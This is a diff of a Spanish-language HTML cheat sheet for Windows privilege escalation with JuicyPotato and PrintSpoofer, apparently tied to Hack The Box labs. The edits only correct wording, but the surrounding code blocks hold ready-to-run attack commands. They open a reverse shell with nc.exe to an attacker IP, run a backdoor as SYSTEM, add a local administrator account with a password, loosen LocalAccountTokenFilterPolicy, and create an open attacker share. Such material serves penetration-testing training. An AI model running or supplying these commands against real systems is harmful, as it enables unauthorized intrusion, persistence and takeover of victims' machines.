@@ -67,11 +67,11 @@ JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a &quot;/c C:\Windows\T
 JuicyPotato.exe -l 53375 -p backdoor.exe -t *
 JuicyPotato.exe -l 53375 -p C:\Windows\Temp\prives\backdoor.exe -t *
 
-# Agregar usuario y hacerlo Admin Local -&gt; Máquina Jeeves HTB (S4vitar)
+# Agregar usuario y hacerlo administrador local -&gt; Máquina Jeeves HTB (S4vitar)
 JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a &quot;/c net user alvaro ruiz123$! /add&quot; -t *
 JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a &quot;/c net localgroup Administrators alvaro /add&quot; -t *
 # Ajustes
-JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a &quot;/c reg add  HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f&quot; -t * # En caso de no aparecer el usuario como Pwned a pesar de ser ADMIN LOCAL
+JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a &quot;/c reg add  HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f&quot; -t * # En caso de no aparecer el usuario como Pwned a pesar de ser administrador local
 JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a &quot;/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL&quot; -t * # En caso de no obtener CMD a pesar de poner Pwned
 
 # Subir JuicyPotato.exe y nc.exe
@@ -81,7 +81,7 @@ JuicyPotato.exe -l 53375  -p c:\windows\system32\cmd.exe -a &quot;/c C:\Windows\
 JuicyPotato.exe -l 53375 -p backdoor.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}</code></pre>
             </section>
 
-            <p><a href="http://ohpe.it/juicy-potato/CLSID/">CLSID</a> (identificador único global de objetos de clase COM) para los diferentes sistema operativo</p>
+            <p><a href="http://ohpe.it/juicy-potato/CLSID/">CLSID</a> (identificador único global de objetos de clase COM) para los diferentes sistemas operativos</p>
 
             <section class="code-card">
               <h3>JuicyPotato: Argumentos</h3>
@@ -107,10 +107,10 @@ JuicyPotato.exe -l 53375 -p backdoor.exe -t * -c {4991d34b-80a1-4291-83b6-332836
               <pre><code># NC.exe
 PrintSpoofer.exe -c &quot;c:\temp\nc.exe &lt;kali_ip&gt; 443 -e cmd&quot;
 
-# Agregar usuario y hacerlo Admin Local -&gt; Máquina Jeeves HTB (S4vitar)
+# Agregar usuario y hacerlo administrador local -&gt; Máquina Jeeves HTB (S4vitar)
 PrintSpoofer.exe -c &quot;net user alvaro ruiz123$! /add&quot;
 PrintSpoofer.exe -c &quot;net localgroup Administrators alvaro /add&quot;
-# Ajustes: # En caso de no aparecer el usuario como Pwned a pesar de ser ADMIN LOCAL
+# Ajustes: en caso de no aparecer el usuario como Pwned a pesar de ser administrador local
 PrintSpoofer.exe -c &quot;reg add  HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f&quot;
 # En caso de no obtener CMD a pesar de poner Pwned
 PrintSpoofer.exe -c &quot;net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL&quot;</code></pre>
